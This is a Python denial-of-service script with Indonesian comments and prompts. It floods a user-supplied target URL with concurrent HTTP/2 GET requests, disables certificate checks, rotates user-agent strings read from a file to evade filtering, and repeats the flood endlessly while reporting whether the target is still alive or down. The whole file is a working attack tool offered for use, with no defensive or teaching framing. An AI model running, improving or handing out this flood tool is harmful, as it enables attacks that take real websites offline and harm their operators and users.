import httpx
import asyncio
import random

async def send_request(client, url, user_agent):
    """Mengirim permintaan HTTP GET ke URL target dengan user-agent tertentu dan mencetak status server."""
    headers = {'User-Agent': user_agent}
    try:
        response = await client.get(url, headers=headers)
        if response.status_code == 200:
            print(f"[ + ] Attack : {url} ( Still Alive )")
        else:
            print(f"[ + ] Attack : {url} ( Down )")
    except httpx.RequestError:
        print(f"[ + ] Attack : {url} ( Down )")

async def run_ddos(url, request_count, concurrent_requests, user_agents):
    """Menjalankan serangan dengan mengirim permintaan HTTP secara bersamaan menggunakan user-agent."""
    sem = asyncio.Semaphore(concurrent_requests)

    async def limited_task():
        async with sem:
            user_agent = random.choice(user_agents)
            async with httpx.AsyncClient(http2=True, verify=False) as client:
                await send_request(client, url, user_agent)

    tasks = [limited_task() for _ in range(request_count)]
    await asyncio.gather(*tasks)

async def main():
    target_url = input("Masukkan URL target: ").strip()
    request_count = int(input("Masukkan jumlah request: "))
    concurrent_requests = int(input("Masukkan batas concurrent requests: "))

    # Membaca user-agent dari file useragent.txt
    try:
        with open('useragent.txt', 'r') as f:
            user_agents = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("File useragent.txt tidak ditemukan.")
        return

    # Menampilkan user-agents untuk debugging
    print("User-Agents yang digunakan:")
    for ua in user_agents:
        print(ua)

    # Loop yang berjalan terus-menerus hingga dihentikan oleh user
    while True:
        await run_ddos(target_url, request_count, concurrent_requests, user_agents)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Serangan dihentikan oleh user.")